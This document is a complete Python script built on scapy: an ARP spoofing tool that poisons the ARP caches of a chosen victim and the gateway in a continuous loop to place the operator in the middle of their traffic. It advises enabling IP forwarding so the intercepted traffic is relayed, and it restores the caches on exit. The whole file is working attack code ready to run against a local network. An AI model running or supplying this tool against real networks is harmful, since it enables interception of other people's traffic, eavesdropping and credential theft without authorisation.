from scapy.layers.l2 import Ether, ARP, srp, sendp
import sys
import time
from scapy.all import get_if_hwaddr  # Added to fetch the attacker's MAC address

# Script now expects 4 total arguments: [script_name, target_ip, gateway_ip, interface_name]
EXPECTED_ARGUMENT_COUNT = 4


def get_mac(ip, interface):
    """
    Sends an ARP request to the specified IP address and returns its MAC address.
    Uses the specified network interface for sending and listening.
    """
    # Create an Ethernet frame with broadcast destination MAC
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    # Create an ARP request packet targeting the given IP
    arp_ip = ARP(pdst=ip)

    # Send and receive packets on layer 2 (Ethernet) using the specified interface
    # timeout=1: wait up to 1 second for a response
    # verbose=0: suppress scapy output
    answered, _ = srp(broadcast / arp_ip, timeout=1, verbose=0, iface=interface)

    if not answered:
        # Raise an exception if no host responds
        raise Exception(f"Host with IP {ip} did not respond to ARP request.")

    # Extract the hardware source (hwsrc) MAC address from the received packet (answered[0][1])
    mac = answered[0][1].hwsrc
    return mac


def restore(victim_ip, gateway_ip, victim_mac_real, gateway_mac_real, interface):
    """
    Restores the ARP tables of the victim and gateway to their correct state.
    Sends packets multiple times to ensure targets update their cache.
    """
    # Restore Victim: tell victim the truth about the gateway's MAC
    # The hwsrc is the REAL gateway MAC
    victim_restore_packet = ARP(op=2,
                                pdst=victim_ip,
                                psrc=gateway_ip,
                                hwdst=victim_mac_real,
                                hwsrc=gateway_mac_real)

    # Restore Gateway: tell gateway the truth about the victim's MAC
    # The hwsrc is the REAL victim MAC
    gateway_restore_packet = ARP(op=2,
                                 pdst=gateway_ip,
                                 psrc=victim_ip,
                                 hwdst=gateway_mac_real,
                                 hwsrc=victim_mac_real)

    # Send packets multiple times on the specified interface
    sendp(victim_restore_packet, count=7, verbose=False, iface=interface)
    sendp(gateway_restore_packet, count=7, verbose=False, iface=interface)

    print("[+] ARP tables successfully restored. Script terminated.")


def spoof(victim_ip, spoof_ip, interface):
    """
    Sends a malicious ARP response packet to the victim using the specified interface.
    """

    # Get the victim's current MAC address
    try:
        victim_mac = get_mac(victim_ip, interface)
    except Exception as e:
        print(f"Error while fetching MAC for {victim_ip}: {e}")
        return

    # op=2: ARP response (is-at)
    # psrc: The IP we are claiming to be (e.g., the Gateway IP when spoofing the Victim)
    # Scapy automatically sets hwsrc (Source MAC) to the Attacker's interface MAC.
    packet = ARP(op=2, hwdst=victim_mac, pdst=victim_ip, psrc=spoof_ip)

    # --- DEBUG INFORMATION ADDED ---
    attacker_mac = get_if_hwaddr(interface)
    print(f"DEBUG: Forging reply for {victim_ip} ({victim_mac}). Claiming {spoof_ip} has MAC {attacker_mac}")
    # -----------------------------

    # Use sendp() for Layer 2 packets to ensure an Ethernet frame is generated.
    sendp(packet, iface=interface, verbose=False)
    print(f"[+] Sent to {victim_ip}: claiming {spoof_ip} is at our MAC address.")


def run(victim_ip, gateway_ip, interface):
    """
    The main spoofing loop that continuously sends ARP packets.
    """
    print("\nStarting ARP Spoofing. Press Ctrl+C to stop...")
    print("------------------------------------------")

    try:
        # Get and store the real MAC addresses before starting the loop
        victim_mac_real = get_mac(victim_ip, interface)
        gateway_mac_real = get_mac(gateway_ip, interface)
        print(f"Target (Victim IP): {victim_ip} (MAC: {victim_mac_real})")
        print(f"Gateway IP: {gateway_ip} (MAC: {gateway_mac_real})")
    except Exception as e:
        print(f"\n[!] Script stopped due to initial MAC lookup failure: {e}")
        return

    # CRITICAL: If you are running this on Linux, you must enable IP forwarding
    # for the spoofing to result in Man-in-the-Middle traffic forwarding.
    print("\n[!] IMPORTANT: Ensure IP forwarding is enabled on your machine!")
    print("Use: sudo sysctl -w net.ipv4.ip_forward=1")

    while True:
        try:
            # Tell the victim that we are the gateway
            spoof(victim_ip, gateway_ip, interface)
            # Tell the gateway that we are the victim
            spoof(gateway_ip, victim_ip, interface)

            time.sleep(2)  # Wait 2 seconds before sending the next pair of packets

        except KeyboardInterrupt:
            print("\n[!] Ctrl+C detected. Restoring ARP tables...")
            # Restore the ARP tables using the real MACs we stored
            restore(victim_ip, gateway_ip, victim_mac_real, gateway_mac_real, interface)
            break
        except Exception as e:
            print(f"\n[!] Critical error: {e}. Attempting to restore ARP tables.")
            restore(victim_ip, gateway_ip, victim_mac_real, gateway_mac_real, interface)
            break


def main():
    if len(sys.argv) != EXPECTED_ARGUMENT_COUNT:
        print("Usage: sudo python3 arpspoof.py <Target IP> <Gateway IP> <Interface Name>")
        print("Example: sudo python3 arpspoof.py 192.168.1.100 192.168.1.1 eth0")
        print(f"Error: Expected {EXPECTED_ARGUMENT_COUNT - 1} arguments, but received {len(sys.argv) - 1}.")
        sys.exit(1)

    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    interface = sys.argv[3]

    print("--- ARP Spoofing Tool ---")
    print(f"Using interface: {interface}")
    print("NOTE: Requires 'scapy' (pip install scapy) and root privileges (sudo).")

    run(victim_ip, gateway_ip, interface)


if __name__ == "__main__":
    main()
